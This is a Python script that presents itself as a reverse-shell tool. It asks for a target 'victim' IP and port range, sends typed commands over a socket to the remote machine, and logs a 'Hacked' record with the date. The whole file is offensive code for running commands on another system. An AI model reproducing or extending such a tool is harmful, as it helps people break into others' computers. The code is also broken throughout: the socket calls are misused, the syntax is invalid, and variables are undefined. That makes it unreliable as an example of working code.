#!/bin/python3

import time
import header
import datetime
import os
import cmd
import sys
import socket
import pyfiglet
import rsa
import subprocess

subprocess.call("cls", shell=True)

header.title(":revshell:", "5lineoblique")


tnow = datetime.time()

def makesockboi():
    print("[+] creating socket...")
    try:
        global s
        global ipaddr 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[+] successfuly created socket")
    except socket.socketError:
        print("[x] could not create socket...RETRYING...")
        makesockboi()
    except KeyboardInterrupt:
        print("[x] but we just started...EXITTING...")


def contovix():
    global ipaddr
    global prange1
    global prange2
    global s
    global vic
    try:
        ipaddr = input("Enter the IP address you'd like to connect to: ")
        prange1 = int(input("From which port range: "))
        prange2 = int(input("To which port range:"))
        print(f"[+] attempting connection to {ipaddr}")
        s.listen(5)
        for port in range(prange1, prange2):
            vic, port = s.accept()
            s.connect((vic, port))
            print(f"[+] connection established with {ipaddr}")
    except KeyboardInterrupt:
        print("\n[x] we were almost there...EXITTING...")
        sys.exit()
    except ConnectionError:
        print(f"\n[x] dang, connection error...{ipaddr} will have to wait")
        sys.exit()
    except ConnectionRefusedError:
        print(f"\n[x] connection to {ipaddr} is refused")
        sys.exit()


def revshell():
    subprocess.call("cls", shell=True)
    global vic
    global port
    global ipaddr
    global s
    
    try:
        while True:
            com = input(f"{ipaddr} $: ")
            s.send(com.encode)
            s.recv(1024)
    except ConnectionError:
        print(f"[x] connection to {ipaddr} has issues")
        sys.exit()
    except com == "exit" or "quit":
        print(f"[!] are you sure you'd like to end your connection with {ipaddr}")
        resp = input("(y or n): ")
        if resp == "y":
            print("[!] ok...ending connection to {ipaddr}")
            s.close()
            sys.exit()
        else:
            revshell()
    except TimeoutError:
        print(f"[x] connection to {ipaddr} timed out...RETRYING...")
        revshell()
        sys.exit()


def main():
    makesockboi()
    contovix()
    revshell()


main()


global ipaddr
global port
global s
global vic


tend = datetime.time()

tofhax = tnow - tend
date = datetime.date()
subprocess.call("cls", shell=True)
print(f"Hack completed...\n You hacked {vic}: ({host}) on {date} \n Your hack took {tofhax}")

with open("hax_progress.txt", "rw") as f:
    f.write(f"{date}\n Hacked {vic} on {date} in {tofhax}")
    f.close()
    
time.sleep(5)

subprocess.call("cls", shell=True)
exscreen = pyfiglet.figlet_format("goodbye")
print(exscreen)
time.sleep(5)
subprocess.call("cls", shell=True)
